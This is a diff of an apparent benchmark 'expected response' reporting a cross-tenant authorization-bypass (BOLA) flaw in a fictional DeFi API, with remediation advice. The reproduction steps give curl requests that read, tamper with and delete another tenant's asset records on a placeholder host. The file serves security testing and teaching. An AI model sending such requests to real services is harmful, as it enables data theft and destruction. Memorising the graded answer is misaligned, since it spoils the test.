@@ -1,53 +1,66 @@
 # Expected Response
 
 ## System
-- Domain: Blockchain / DeFi
-- System: ChainVault DeFi API
+- System: ChainVault DeFi API v5.6.0
+- Domain: BLOCKCHAIN / DeFi
 - Example ID: BOLA-0085
+- Risk ID: RISK-51-085
 
-## Priority Findings
+## Findings
 
-### Finding 1: Authorization-bypass injection (Pattern 5.1)
-**Severity:** Critical
-**Category:** Injection
+### 1. Pattern 5.1 — Authorization-Bypass via ID Injection: Cross-Tenant DeFi Asset PATCH on `/api/v3/assets/:id` (HAR Primary)
 
-**Summary:**
-The `/api/v1/resources` endpoint is vulnerable to Pattern 5.1 (Authorization-bypass injection).
-An authenticated user from `ORG-D3F6` can access or modify objects owned by `ORG-74E1`
-by manipulating the resource identifier in the request.
+The `GET/PATCH/DELETE /api/v3/assets/:id` endpoint queries by `asset_id` only. An attacker injects a cross-tenant `asset_id` into the path to bypass authorization and access or modify another tenant's DeFi assets (token holdings, liquidity positions, wallet records). Pattern 5.1 "authorization-bypass injection" — the injected cross-tenant ID is accepted by the handler without any ownership or tenant validation, bypassing the authorization layer entirely.
 
-**Evidence from artifact:**
-- Request JWT `tenantId`: `ORG-D3F6`
-- Response body `tenantId`: `ORG-74E1` — confirms cross-tenant data returned
-- HTTP status: 200 — no authorization failure
-- `sensitiveData` field exposed across tenant boundary
+**Evidence from HAR:**
+- Request: `PATCH /api/v3/assets/ASS-2085` from `ORG-D3F6` (`X-Tenant-ID: ORG-D3F6`)
+- Response `tenantId: "ORG-74E1"` — cross-tenant asset modification confirmed
+- Response `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-74E1"` — DeFi asset data exposed
+- HTTP status: 200 — authorization bypass succeeded
 
-**Root Cause:**
-Database query does not include `WHERE owner_id = $authenticatedUserId AND tenant_id = $jwtTenantId`.
-The application trusts the path parameter alone.
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Authorize baseline
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.chainvault-defi.example.com/api/v1/resources/RES-1085" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>"
+curl -s "https://api.chainvault-defi.example.com/api/v3/assets/ASS-1085" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>" \
+  -H "X-Tenant-ID: ORG-D3F6"
 ```
-Expected: Returns own record with `tenantId: "ORG-D3F6"`.
+**Expected:** Returns own DeFi asset with `tenantId: "ORG-D3F6"`.
 
-### Step 2 — ID substitution
+**Step 2 — Cross-tenant DeFi asset PATCH: authorization-bypass injection (primary HAR attack):**
 ```bash
-curl -s "https://api.chainvault-defi.example.com/api/v1/resources/RES-2085" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>"
+curl -s -X PATCH "https://api.chainvault-defi.example.com/api/v3/assets/ASS-2085" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>" \
+  -H "X-Tenant-ID: ORG-D3F6" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "frozen", "sensitive_data": "defi_asset_tampered_by_attacker"}'
 ```
-**Vulnerable:** Returns `tenantId: "ORG-74E1"` and `sensitiveData`.
-**Secure:** HTTP 403 or 404.
+**Vulnerable outcome:** Returns `tenantId: "ORG-74E1"` — another tenant's DeFi token/liquidity position frozen or corrupted.
 
-### Step 3 — Variant tests based on Pattern 5.1
-No specific variant documented for Pattern 5.1 — use Steps 1-2.
+**Step 3 — Cross-tenant DeFi asset DELETE: destroy asset record:**
+```bash
+curl -s -X DELETE "https://api.chainvault-defi.example.com/api/v3/assets/ASS-2085" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>" \
+  -H "X-Tenant-ID: ORG-D3F6"
+```
+**Vulnerable outcome:** Victim's DeFi asset record deleted — loss of on-chain position tracking, financial exposure.
+
+**Step 4 — Cross-tenant DeFi asset read:**
+```bash
+curl -s "https://api.chainvault-defi.example.com/api/v3/assets/ASS-2085" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>" \
+  -H "X-Tenant-ID: ORG-D3F6"
+```
+**Vulnerable outcome:** Returns `sensitiveData` — competitor's DeFi holdings and positions exposed.
+
+## Secure Outcome
+```json
+{ "error": "Forbidden", "code": 403 }
+```
 
 ## Remediation
-1. Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub` to all queries that accept user-supplied IDs.
-2. Centralise authorization middleware: never allow ID resolution without ownership check.
-3. Use non-sequential, randomly-generated UUIDs for object IDs to reduce enumeration risk.
-4. Add regression test: Tenant A token requests Tenant B ID — assert 403/404.
+- Add `WHERE asset_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all asset queries (RISK-51-085).
+- Validate ownership before any write (PATCH, DELETE) on asset records.
+- Centralize authorization middleware: never resolve asset IDs without ownership check.
+- Use non-sequential UUIDs for asset IDs to reduce enumeration risk.
